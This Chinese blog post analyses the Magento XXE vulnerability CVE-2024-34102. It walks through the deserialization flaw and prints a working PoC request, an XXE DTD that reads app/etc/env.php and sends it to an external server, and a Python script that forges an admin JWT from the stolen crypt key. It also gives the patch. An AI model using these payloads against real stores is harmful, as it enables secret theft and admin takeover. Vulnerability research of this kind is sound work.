title: CVE-2024-34102 Magento XXE 漏洞分析
author: Bmth
tags: []
top_img: 'https://img-blog.csdnimg.cn/direct/92d3c4b09c794a0f93ba9456369929b2.png'
cover: 'https://img-blog.csdnimg.cn/direct/92d3c4b09c794a0f93ba9456369929b2.png'
categories:
  - 漏洞分析
date: 2024-06-28 20:42:00
---
![](https://img-blog.csdnimg.cn/direct/92d3c4b09c794a0f93ba9456369929b2.png)

最近看到一个XXE漏洞，CVSS给了9.8的高分，这就不得不分析一下了：[https://github.com/advisories/GHSA-m8cj-3v68-3cxj](https://github.com/advisories/GHSA-m8cj-3v68-3cxj)

影响版本：
```
= 2.4.4
>= 2.4.6-p1, < 2.4.6-p6
>= 2.4.5-p1, < 2.4.5-p8
< 2.4.4-p9
= 2.4.5
= 2.4.6
= 2.4.7
```
## 环境搭建
漏洞复现啥的都还好说，环境是真麻烦

推荐使用：[https://github.com/markshust/docker-magento/](https://github.com/markshust/docker-magento/)
```bash
# Create your project directory then go into it:
mkdir -p ~/Sites/magento
cd $_

# Run this automated one-liner from the directory you want to install your project.
curl -s https://raw.githubusercontent.com/markshust/docker-magento/master/lib/onelinesetup | bash -s -- magento.test 2.4.7 community
```
按照教程来，一步到胃
![](https://img-blog.csdnimg.cn/direct/3eee9b355b464007b53e83c952c38f21.png)

需要改一下hosts

切换到 magento-php 容器，禁用双重认证
```bash
bin/magento module:disable Magento_AdminAdobeImsTwoFactorAuth
bin/magento module:disable Magento_TwoFactorAuth
```
后台路径：[https://magento.test/admin](https://magento.test/admin)
默认管理员账号密码：john.smith/password123

## 漏洞分析
网上已经写的很详细了：[https://www.assetnote.io/resources/research/why-nested-deserialization-is-harmful-magento-xxe-cve-2024-34102](https://www.assetnote.io/resources/research/why-nested-deserialization-is-harmful-magento-xxe-cve-2024-34102)

看到`lib/internal/Magento/Framework/Webapi/ServiceInputProcessor.php#_createFromArray`
![](https://img-blog.csdnimg.cn/direct/4150b783e59346ac8d00d0a20eebf204.png)

关键的地方就是通过 getConstructorData 方法获取构造函数参数，并使用这些参数创建一个对象，跟进 getConstructorData 方法
![](https://img-blog.csdnimg.cn/direct/e35d550de199474fb34367b1b64d5313.png)

获取该类的构造函数，调用`$constructor->getParameters()`获取构造函数的参数列表，并遍历参数列表检查`$data`中是否有对应的键，如果存在，则会调用 convertValue 方法，参数为键对应的值
```php
$res[$parameter->getName()] = $this->convertValue($data[$parameter->getName()], $parameterType);
```
![](https://img-blog.csdnimg.cn/direct/44df014248e54d1dade01aa7eaf818ef.png)

进行一些判断，然后调用 processComplexTypes 方法
![](https://img-blog.csdnimg.cn/direct/e24bffa93c8d42adaa7cbac06ce3d507.png)

看到又调用到`_createFromArray`方法，即会递归调用构造方法

打过CTF的都知道，php存在一些原生类的利用

SimpleXMLElement 触发XXE
```php
new SimpleXMLElement("http://6wovn93g.dnslog.pw/evil.xml",2,true);
```
SQLite3 创建空白文件
```php
new SQLite3('/tmp/mysqlitedb.db');
```

最后就是找链了，没啥好说的
## 漏洞利用
POC已经公开了：[https://raw.githubusercontent.com/karkis3c/cves/main/CVE-2024-34102/CVE-2024-34102.yaml](https://raw.githubusercontent.com/karkis3c/cves/main/CVE-2024-34102/CVE-2024-34102.yaml)
```
/rest/V1/guest-carts/1/estimate-shipping-methods

{"address":{"totalsCollector":{"collectorList":{"totalCollector":{"sourceData":{"data":"http://192.168.111.1:8000/file.xml","dataIsURL":true,"options":12345678}}}}}}
```
根据文章，尝试读取env.php
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=../app/etc/env.php">
  <!ENTITY % dtd SYSTEM "http://192.168.111.1:8888/data.dtd"> %dtd;
]>
<data>&send;</data>
```
使用ftp回显：[https://github.com/LandGrey/xxe-ftp-server](https://github.com/LandGrey/xxe-ftp-server)
![](https://img-blog.csdnimg.cn/direct/81c357290d05428bab92e5d281473359.png)

base64解码得到key
![](https://img-blog.csdnimg.cn/direct/3150f43f055c46df808439ce7645a783.png)

得到：`'crypt' => [ 'key' => 'base64A9myPvYovOhTDAspj4Qmv/fba5LXK+vvycXqwF7iKxU=' ]`

### JWT Attack
REST API：[https://developer.adobe.com/commerce/webapi/rest/](https://developer.adobe.com/commerce/webapi/rest/)

看到`app/code/Magento/Integration/etc/webapi.xml`
![](https://img-blog.csdnimg.cn/direct/3cc5d5951ba14cc2b30753288d957c56.png)

我们可以通过`/rest/V1/integration/admin/token`接口获取JWT令牌
![](https://img-blog.csdnimg.cn/direct/9306067a5701418fadfe9f6e145293e9.png)

对应的方法在`app/code/Magento/Integration/Model/AdminTokenService.php#createAdminAccessToken`
![](https://img-blog.csdnimg.cn/direct/b61a34522fac4c9ea068a959b898c399.png)

走到了`app/code/Magento/JwtUserToken/Model/Issuer.php#create`
![](https://img-blog.csdnimg.cn/direct/fbd3b99a58e24baeb421ad56ed36bb45.png)

![](https://img-blog.csdnimg.cn/direct/6f12cb79039c4c77be67d2d5eb19421c.png)

很明显就是一些参数的获取，其中utypid为2时，为admin类型用户，最后会调用`$this->jwtManager->create`创建JWT令牌

这里最重要的就是`$settings`，决定了加密算法、密钥等设置
```php
$settings = $this->settingsProvider->prepareSettingsFor($userContext);
```
`app/code/Magento/JwtUserToken/Model/ConfigurableJwtSettingsProvider.php#prepareAllAccepted`
![](https://img-blog.csdnimg.cn/direct/3d0c3e5db03c4889a393ffc2f6390513.png)

getJwtAlgorithm方法获取当前算法`$algorithm`，然后判断是走JWS还是JWE

看到`app/code/Magento/JwtUserToken/Model/Config/ConfigReader.php#getJwtAlgorithm`
![](https://img-blog.csdnimg.cn/direct/62c3a5d355a5442abb334f8f9b5a299d.png)

从`app/code/Magento/JwtUserToken/etc/config.xml`中可以获取到该值
![](https://img-blog.csdnimg.cn/direct/9dd4633ab0414dae997113b517a328e5.png)

默认签名算法为HS256，回到 prepareAllAccepted 方法，最终会执行到`app/code/Magento/JwtUserToken/Model/SecretBasedJwksFactory.php#createFor`
![](https://img-blog.csdnimg.cn/direct/86e8f82a39244e8a8fd1c3d8426c187c.png)

显然`$this->keys`就是密钥，该值会从配置`crypt/key`中获取，然后前后填充`&`字符直到2048个字符
```php
$this->keys = preg_split('/\s+/s', trim((string)$deploymentConfig->get('crypt/key')));
//Making sure keys are large enough.
foreach ($this->keys as &$key) {
    $key = str_pad($key, 2048, '&', STR_PAD_BOTH);
}
```
![](https://img-blog.csdnimg.cn/direct/ce75bdf2a7b340eea9df8ff3534340dd.png)

我们简单执行一下就可以拿到该值了

exp：
```python
import jwt
import datetime

iat = datetime.datetime.now()
exp = iat + datetime.timedelta(hours=1)

payload = {
  "uid": 1,
  "utypid": 2,
  "iat": int(iat.timestamp()),
  "exp": int(exp.timestamp())
}

headers = {
  "kid": "1",
  "alg": "HS256"
}

encoded_jwt = jwt.encode(payload, '&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&base64A9myPvYovOhTDAspj4Qmv/fba5LXK+vvycXqwF7iKxU=&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&', algorithm='HS256',headers=headers)
print(encoded_jwt)
```

测试的版本为2.4.7，其他版本可能稍作不同


### CVE-2024-2961
[https://www.ambionics.io/blog/iconv-cve-2024-2961-p1](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)
![](https://img-blog.csdnimg.cn/direct/1f797059630841959040d883e1e6c141.png)

文章介绍了几种利用姿势，其中就包括XXE

利用脚本：[https://github.com/ambionics/cnext-exploits/](https://github.com/ambionics/cnext-exploits/)

## 漏洞修复
![](https://img-blog.csdnimg.cn/direct/719e54d3c0404f8d9afe019e3a1c0c06.png)

检查对象是否继承或者实现SimpleXMLElement、DOMElement类。如果为true则直接抛出异常

参考：
[https://github.com/spacewasp/public_docs/blob/main/CVE-2024-34102.md](https://github.com/spacewasp/public_docs/blob/main/CVE-2024-34102.md)